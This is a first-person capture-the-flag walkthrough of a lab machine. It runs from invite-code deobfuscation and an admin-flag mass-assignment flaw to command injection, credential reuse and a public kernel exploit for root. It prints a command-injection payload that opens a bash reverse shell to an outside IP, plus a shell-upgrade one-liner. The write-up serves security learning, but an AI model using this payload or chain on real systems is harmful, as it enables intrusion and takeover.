**STEPS TAKEN**

Ran an nmap scan to detect open ports, after which I added -sCV for the open ports



Saw a login page, tried SQLi, didn't work

Saw a join button, decided to try to register, maybe I can gain admin access if the backend trusts user input (user id), nothing

All this was being done in burp suite, while intercepting traffic. Saw that a query was made to /js/inviteapi.min.js

Copied that url, pasted to another tab on chromium and saw an obfuscated js, used https://deobfuscate.relative.im/ to deobfuscate, still didn't real like normal code,but I noticed it was packed (learnt this in one of the previous courses I've taken on HTB --free)
So, I copied the output from https://deobfuscate.relative.im/ to https://matthewfl.com/unPacker.html to unpack, and there, a js code that makes sense

From the js code, saw two functions, and the second (make invite code) contains a path on how I can make invite code

It also stated that the method has to be post, and data should be json
Again, sent a post request to it in burp (repeater) an encrypted message in response, ROT13 was specified as the encryption type
So, I copied the data, pasted it at https://rot13.com/ to get the plaintext and it said: In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate


So now, I know I have to make a post request to that url, made the post request, using curl this time (easier) and I got a response, it was also stated that the code is encoded, looking at it, it ends with =, a huge sign of base64 encoding, sure enough, I got an invite code, time to create an account

Created an account, and now I'm logged in


Scrolling through the pages here doesn't reveal much, we have the changelog page which hints us about the version of services running there, 2017, probably a public exploit


At this point, I didn't know what to do, played around, one thing struck me about the connection tab though, played around with the repeater a bit, trying to access different endpoints till I stumbled on /api/v1 which gave 200 and listed all the available endpoints, giving me a broad view of the website. Saw different categories, the ones that stood out are the admin api endpoints, knew something fishy is definitely going down:



"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}


Checked admin/auth, got a message: false, of course we're not an admin. Tried vpn/generate, got a 401, unauthorized. That leaves me with only settings/update, got an invalid content file, remember we said earlier that is accepts json, modified the request to use json, and now we got a missing parameter email, added the main I used to open the account, retried and now got missing parameter is_admin, after which we got a pleasant response, looks like we're now admin, let's verify with /admin/auth, and we got a true!!!!!!!!!!!

And now that we're admin, what can we do, nothing seems interesting, switched to guided mode to see what is going on and there, I can see that an api endpoint has command injection vulnerability in it, I'll just try one at a time. It has to be one of those endpoints that take an input generate or update


Ran into a little trouble and I had to generate a new cookie. And confirmed, the /api/v1/admin/generate endpoint is vulnerable to command injection, sent this:

{
	"username":"Adeking$(bash -c 'bash -i >& /dev/tcp/10.10.17.12/4444 0>&1')"
}
And now, I have a shell, upgrade and import xterm
python3 -c "import pty; pty.spawn('/bin/bash')"


On getting the terminal, ran ls, checked the content of Database.php and .env, found a username and a password belonging to admin (SuperDuperPass123), used in database, it was reused for the admin user account, sshed into admin and got the user flag



Now to escalate privilege, I first checked if admin can run any command as sudo using sudo -l, got: Sorry, user admin may not run sudo on localhost.
Ran: find / -user admin 2>/dev/null | grep -v '/proc\|^/run\|^/sys' 

Checked the content of the files and directory, found a mail about a public exploit, and yes, we were right all along.

Searched about the exploit, found this github repo: https://github.com/puckiestyle/CVE-2023-0386/
Followed the readme.md and got a root shell








